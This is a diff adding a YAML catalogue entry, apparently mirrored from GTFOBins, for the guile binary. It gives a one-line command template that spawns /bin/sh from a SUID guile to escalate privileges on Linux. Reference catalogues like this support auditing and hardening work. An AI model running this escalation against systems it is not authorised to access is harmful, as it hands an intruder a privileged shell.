@@ -1,0 +1,24 @@
+id: gtfobins/guile/shell/suid
+type: binary
+platform: linux
+name: guile
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: guile -c '(system "/bin/sh")'
+references:
+- https://gtfobins.github.io/gtfobins/guile/
+tags:
+- linux
+- unix
+- gtfobins
